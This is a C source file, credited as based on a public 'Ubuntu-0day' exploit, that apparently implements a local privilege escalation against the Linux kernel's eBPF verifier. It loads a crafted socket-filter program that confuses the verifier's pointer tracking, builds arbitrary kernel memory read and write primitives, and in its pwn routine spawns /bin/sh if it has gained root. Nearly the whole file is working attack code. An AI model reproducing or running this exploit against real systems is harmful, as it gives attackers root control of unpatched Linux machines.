/* Based on
 * https://raw.githubusercontent.com/jas502n/Ubuntu-0day/master/upstream44.c */

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <syscall.h>
#include <unistd.h>

/* linux/types.h */

typedef unsigned char __u8;
typedef unsigned short __u16;
typedef unsigned int __u32;
typedef unsigned long __u64;
typedef char __s8;
typedef short __s16;
typedef int __s32;
typedef long __s64;

#define __aligned_u64 __u64 __attribute__((aligned(8)))

/* linux/bpf_common.h */

#define BPF_CLASS(code) ((code)&0x07)
#define BPF_LD 0x00
#define BPF_LDX 0x01
#define BPF_ST 0x02
#define BPF_STX 0x03
#define BPF_ALU 0x04
#define BPF_JMP 0x05
#define BPF_RET 0x06
#define BPF_MISC 0x07

#define BPF_SIZE(code) ((code)&0x18)
#define BPF_W 0x00
#define BPF_H 0x08
#define BPF_B 0x10
#define BPF_MODE(code) ((code)&0xe0)
#define BPF_IMM 0x00
#define BPF_ABS 0x20
#define BPF_IND 0x40
#define BPF_MEM 0x60
#define BPF_LEN 0x80
#define BPF_MSH 0xa0

#define BPF_OP(code) ((code)&0xf0)
#define BPF_ADD 0x00
#define BPF_SUB 0x10
#define BPF_MUL 0x20
#define BPF_DIV 0x30
#define BPF_OR 0x40
#define BPF_AND 0x50
#define BPF_LSH 0x60
#define BPF_RSH 0x70
#define BPF_NEG 0x80
#define BPF_MOD 0x90
#define BPF_XOR 0xa0

#define BPF_JA 0x00
#define BPF_JEQ 0x10
#define BPF_JGT 0x20
#define BPF_JGE 0x30
#define BPF_JSET 0x40
#define BPF_SRC(code) ((code)&0x08)
#define BPF_K 0x00
#define BPF_X 0x08

/* linux/bpf.h. */

#define BPF_JMP32 0x06
#define BPF_ALU64 0x07

#define BPF_DW 0x18
#define BPF_XADD 0xc0

#define BPF_MOV 0xb0
#define BPF_ARSH 0xc0

#define BPF_END 0xd0
#define BPF_TO_LE 0x00
#define BPF_TO_BE 0x08
#define BPF_FROM_LE BPF_TO_LE
#define BPF_FROM_BE BPF_TO_BE

#define BPF_JNE 0x50
#define BPF_JLT 0xa0
#define BPF_JLE 0xb0
#define BPF_JSGT 0x60
#define BPF_JSGE 0x70
#define BPF_JSLT 0xc0
#define BPF_JSLE 0xd0
#define BPF_CALL 0x80
#define BPF_EXIT 0x90

enum {
  BPF_REG_0 = 0,
  BPF_REG_1,
  BPF_REG_2,
  BPF_REG_3,
  BPF_REG_4,
  BPF_REG_5,
  BPF_REG_6,
  BPF_REG_7,
  BPF_REG_8,
  BPF_REG_9,
  BPF_REG_10,
  __MAX_BPF_REG,
};

struct bpf_insn {
  __u8 code;
  __u8 dst_reg : 4;
  __u8 src_reg : 4;
  __s16 off;
  __s32 imm;
};

enum bpf_cmd {
  BPF_MAP_CREATE,
  BPF_MAP_LOOKUP_ELEM,
  BPF_MAP_UPDATE_ELEM,
  BPF_MAP_DELETE_ELEM,
  BPF_MAP_GET_NEXT_KEY,
  BPF_PROG_LOAD,
};

enum bpf_map_type {
  BPF_MAP_TYPE_UNSPEC,
  BPF_MAP_TYPE_HASH,
  BPF_MAP_TYPE_ARRAY,
};

enum bpf_prog_type {
  BPF_PROG_TYPE_UNSPEC,
  BPF_PROG_TYPE_SOCKET_FILTER,
};

#define BPF_PSEUDO_MAP_FD 1
#define BPF_PSEUDO_MAP_VALUE 2

#define BPF_OBJ_NAME_LEN 16U

union bpf_attr {
  struct {
    __u32 map_type;
    __u32 key_size;
    __u32 value_size;
    __u32 max_entries;
    __u32 map_flags;
    __u32 inner_map_fd;
    __u32 numa_node;
    char map_name[BPF_OBJ_NAME_LEN];
    __u32 map_ifindex;
    __u32 btf_fd;
    __u32 btf_key_type_id;
    __u32 btf_value_type_id;
  };

  struct {
    __u32 map_fd;
    __aligned_u64 key;
    union {
      __aligned_u64 value;
      __aligned_u64 next_key;
    };
    __u64 flags;
  };

  struct {
    __u32 prog_type;
    __u32 insn_cnt;
    __aligned_u64 insns;
    __aligned_u64 license;
    __u32 log_level;
    __u32 log_size;
    __aligned_u64 log_buf;
    __u32 kern_version;
    __u32 prog_flags;
    char prog_name[BPF_OBJ_NAME_LEN];
    __u32 prog_ifindex;
    __u32 expected_attach_type;
    __u32 prog_btf_fd;
    __u32 func_info_rec_size;
    __aligned_u64 func_info;
    __u32 func_info_cnt;
    __u32 line_info_rec_size;
    __aligned_u64 line_info;
    __u32 line_info_cnt;
  };
} __attribute__((aligned(8)));

#define __BPF_FUNC_MAPPER(FN)                                                  \
  FN(unspec), FN(map_lookup_elem), FN(map_update_elem),

/* integer value in 'imm' field of BPF_CALL instruction selects which helper
 * function eBPF program intends to call
 */
#define __BPF_ENUM_FN(x) BPF_FUNC_##x
enum bpf_func_id {
  __BPF_FUNC_MAPPER(__BPF_ENUM_FN) __BPF_FUNC_MAX_ID,
};
#undef __BPF_ENUM_FN

/* man 2 bpf */

static char bpf_log_buf[65536];

static int bpf_prog_load(enum bpf_prog_type prog_type,
                         const struct bpf_insn *insns, int insn_cnt,
                         const char *license) {
  union bpf_attr attr = {
      .prog_type = prog_type,
      .insns = (__u64)insns,
      .insn_cnt = insn_cnt,
      .license = (__u64)license,
      .log_buf = (__u64)bpf_log_buf,
      .log_size = sizeof(bpf_log_buf),
      .log_level = 1,
  };

  return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size,
                          int value_size, int max_entries) {
  union bpf_attr attr = {.map_type = map_type,
                         .key_size = key_size,
                         .value_size = value_size,
                         .max_entries = max_entries};

  return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd, const void *key, const void *value,
                           uint64_t flags) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (__u64)key,
      .value = (__u64)value,
      .flags = flags,
  };

  return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(int fd, const void *key, void *value) {
  union bpf_attr attr = {
      .map_fd = fd,
      .key = (__u64)key,
      .value = (__u64)value,
  };

  return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

/* tools/include/linux/filter.h */

#define BPF_ALU64_REG(OP, DST, SRC)                                            \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_ALU32_REG(OP, DST, SRC)                                            \
  ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_X,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_ALU64_IMM(OP, DST, IMM)                                            \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_ALU32_IMM(OP, DST, IMM)                                            \
  ((struct bpf_insn){.code = BPF_ALU | BPF_OP(OP) | BPF_K,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_ENDIAN(TYPE, DST, LEN)                                             \
  ((struct bpf_insn){.code = BPF_ALU | BPF_END | BPF_SRC(TYPE),                \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = LEN})

#define BPF_MOV64_REG(DST, SRC)                                                \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X,                      \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_MOV32_REG(DST, SRC)                                                \
  ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_X,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = 0})

#define BPF_MOV64_IMM(DST, IMM)                                                \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K,                      \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_MOV32_IMM(DST, IMM)                                                \
  ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_MOV64_RAW(TYPE, DST, SRC, IMM)                                     \
  ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_SRC(TYPE),              \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_MOV32_RAW(TYPE, DST, SRC, IMM)                                     \
  ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_SRC(TYPE),                \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = IMM})

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                                       \
  ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,               \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)                                       \
  ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,               \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)                                        \
  ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,                \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = IMM})

#define BPF_JMP_REG(OP, DST, SRC, OFF)                                         \
  ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_JMP32_REG(OP, DST, SRC, OFF)                                       \
  ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_X,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_JMP_IMM(OP, DST, IMM, OFF)                                         \
  ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K,                     \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = IMM})

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)                                       \
  ((struct bpf_insn){.code = BPF_JMP32 | BPF_OP(OP) | BPF_K,                   \
                     .dst_reg = DST,                                           \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = IMM})

#define BPF_JMP_A(OFF)                                                         \
  ((struct bpf_insn){.code = BPF_JMP | BPF_JA,                                 \
                     .dst_reg = 0,                                             \
                     .src_reg = 0,                                             \
                     .off = OFF,                                               \
                     .imm = 0})

#define BPF_EMIT_CALL(FUNC)                                                    \
  ((struct bpf_insn){.code = BPF_JMP | BPF_CALL,                               \
                     .dst_reg = 0,                                             \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = ((FUNC)-BPF_FUNC_unspec)})

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)                                 \
  ((struct bpf_insn){                                                          \
      .code = CODE, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = IMM})

#define BPF_LD_IMM64(DST, IMM) BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)                                        \
  ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = 0,                                                 \
                     .imm = (__u32)(IMM)}),                                    \
      ((struct bpf_insn){.code = 0,                                            \
                         .dst_reg = 0,                                         \
                         .src_reg = 0,                                         \
                         .off = 0,                                             \
                         .imm = ((__u64)(IMM)) >> 32})

#define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2)                \
  ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM,                        \
                     .dst_reg = DST,                                           \
                     .src_reg = SRC,                                           \
                     .off = OFF1,                                              \
                     .imm = IMM1}),                                            \
      ((struct bpf_insn){                                                      \
          .code = 0, .dst_reg = 0, .src_reg = 0, .off = OFF2, .imm = IMM2})

#define BPF_LD_MAP_FD(DST, MAP_FD)                                             \
  BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0, MAP_FD, 0)

#define BPF_LD_MAP_VALUE(DST, MAP_FD, VALUE_OFF)                               \
  BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_VALUE, 0, 0, MAP_FD, VALUE_OFF)

#define BPF_CALL_REL(TGT)                                                      \
  ((struct bpf_insn){.code = BPF_JMP | BPF_CALL,                               \
                     .dst_reg = 0,                                             \
                     .src_reg = BPF_PSEUDO_CALL,                               \
                     .off = 0,                                                 \
                     .imm = TGT})

#define BPF_EXIT_INSN()                                                        \
  ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT,                               \
                     .dst_reg = 0,                                             \
                     .src_reg = 0,                                             \
                     .off = 0,                                                 \
                     .imm = 0})

/* helpers */

static void __die_errno(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: ", path, line);
  perror(msg);
  exit(1);
}

#define die_errno(msg) __die_errno(__FILE__, __LINE__, msg)

static void __die(const char *path, int line, const char *msg) {
  fprintf(stderr, "%s:%d: %s\n", path, line, msg);
  exit(1);
}

#define die(msg) __die(__FILE__, __LINE__, msg)

/* initialization */

static int map_fd, prog_fd, sockets[2];

#define READ_U64 0
#define GET_FP 1
#define WRITE_U64 2

/*
   0:	b4 09 00 00 ff ff ff ff 	mov32 %r9,-1
   8:	55 09 02 00 ff ff ff ff 	jne %r9,-1,2
  10:	b7 00 00 00 00 00 00 00 	mov %r0,0
  18:	95 00 00 00 00 00 00 00 	exit
  20:	18 19 00 00 03 00 00 00 	lddw %r9,3
  28:	00 00 00 00 00 00 00 00
  30:	bf 91 00 00 00 00 00 00 	mov %r1,%r9
  38:	bf a2 00 00 00 00 00 00 	mov %r2,%fp
  40:	07 02 00 00 fc ff ff ff 	add %r2,-4
  48:	62 0a fc ff 00 00 00 00 	stw [%fp+-4],0
  50:	85 00 00 00 01 00 00 00 	call 1
  58:	55 00 01 00 00 00 00 00 	jne %r0,0,1
  60:	95 00 00 00 00 00 00 00 	exit
  68:	79 06 00 00 00 00 00 00 	ldxdw %r6,[%r0+0]
  70:	bf 91 00 00 00 00 00 00 	mov %r1,%r9
  78:	bf a2 00 00 00 00 00 00 	mov %r2,%fp
  80:	07 02 00 00 fc ff ff ff 	add %r2,-4
  88:	62 0a fc ff 01 00 00 00 	stw [%fp+-4],1
  90:	85 00 00 00 01 00 00 00 	call 1
  98:	55 00 01 00 00 00 00 00 	jne %r0,0,1
  a0:	95 00 00 00 00 00 00 00 	exit
  a8:	79 07 00 00 00 00 00 00 	ldxdw %r7,[%r0+0]
  b0:	bf 91 00 00 00 00 00 00 	mov %r1,%r9
  b8:	bf a2 00 00 00 00 00 00 	mov %r2,%fp
  c0:	07 02 00 00 fc ff ff ff 	add %r2,-4
  c8:	62 0a fc ff 02 00 00 00 	stw [%fp+-4],2
  d0:	85 00 00 00 01 00 00 00 	call 1
  d8:	55 00 01 00 00 00 00 00 	jne %r0,0,1
  e0:	95 00 00 00 00 00 00 00 	exit
  e8:	79 08 00 00 00 00 00 00 	ldxdw %r8,[%r0+0]
  f0:	bf 02 00 00 00 00 00 00 	mov %r2,%r0
  f8:	b7 00 00 00 00 00 00 00 	mov %r0,0
 100:	55 06 03 00 00 00 00 00 	jne %r6,0,3
 108:	79 73 00 00 00 00 00 00 	ldxdw %r3,[%r7+0]
 110:	7b 32 00 00 00 00 00 00 	stxdw [%r2+0],%r3
 118:	95 00 00 00 00 00 00 00 	exit
 120:	55 06 02 00 01 00 00 00 	jne %r6,1,2
 128:	7b a2 00 00 00 00 00 00 	stxdw [%r2+0],%fp
 130:	95 00 00 00 00 00 00 00 	exit
 138:	7b 87 00 00 00 00 00 00 	stxdw [%r7+0],%r8
 140:	95 00 00 00 00 00 00 00 	exit
*/

static void prep(void) {
  map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(uint64_t), 3);
  if (map_fd < 0)
    die_errno("bpf_create_map");

  struct bpf_insn prog[] = {
      BPF_LD_MAP_FD(BPF_REG_1, map_fd), /* r1 = map */
      BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
      BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), /* r2 = &key */
      BPF_ST_MEM(BPF_W, BPF_REG_2, 0, 0),    /* key = 0 */
      BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0,
                   BPF_FUNC_map_lookup_elem), /* r0 = PTR_TO_MAP_VALUE &value */
      BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),  /* if (r0 == NULL) return; */
      BPF_EXIT_INSN(),
      BPF_ALU64_IMM(BPF_XOR, BPF_REG_0,
                    0), /* r0 = SCALAR_VALUE auth_map=1 &value */
      BPF_ALU64_REG(BPF_SUB, BPF_REG_0,
                    BPF_REG_0),             /* r0 = SCALAR_VALUE auth_map=1 0 */
      BPF_ALU64_IMM(BPF_XOR, BPF_REG_0, 0), /* r0 = PTR_TO_MAP_VALUE 0 */
      BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0), /* r0 = *r0 */
      BPF_EXIT_INSN(),
  };

  prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog,
                          sizeof(prog) / sizeof(prog[0]), "GPL");
  if (prog_fd < 0) {
    fprintf(stderr, "%s\n", bpf_log_buf);
    die_errno("bpf_prog_load");
  }

  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) == -1)
    die_errno("socketpair");

  if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
                 sizeof(prog_fd)) == -1)
    die_errno("setsockopt");
}

/* communicating with prog */

static uint64_t call_prog(int cmd, uint64_t addr, uint64_t val) {
  bpf_update_elem(map_fd, (void *)0, (void *)(uint64_t)cmd, 0);
  bpf_update_elem(map_fd, (void *)1, (void *)addr, 0);
  bpf_update_elem(map_fd, (void *)2, (void *)val, 0);

  char buffer[64];

  memset(buffer, 0, sizeof(buffer));
  ssize_t n = write(sockets[0], buffer, sizeof(buffer));
  if (n < 0)
    die_errno("write");
  if (n != sizeof(buffer))
    fprintf(stderr, "short write: %zd\n", n);

  int key = 2;
  uint64_t result;
  if (bpf_lookup_elem(map_fd, &key, &result) < 0)
    die_errno("bpf_lookup_elem");
  return result;
}

static uint64_t get_fp(void) { return call_prog(GET_FP, 0, 0); }

static uint64_t read_u64(uint64_t addr) { return call_prog(READ_U64, addr, 0); }

static void write_u64(uint64_t addr, uint64_t val) {
  call_prog(WRITE_U64, addr, val);
}

extern char **environ;

static void pwn(void) {
  uint64_t fp = get_fp();
  uint64_t val = read_u64(fp);
  write_u64(fp, val);

  if (getuid() == 0) {
    char bin_sh[] = "/bin/sh";
    char *argv[] = {bin_sh, NULL};
    execve(bin_sh, argv, environ);
    die_errno("execve");
  }

  die("not vulnerable");
}

int main(void) {
  prep();
  pwn();
  return 0;
}
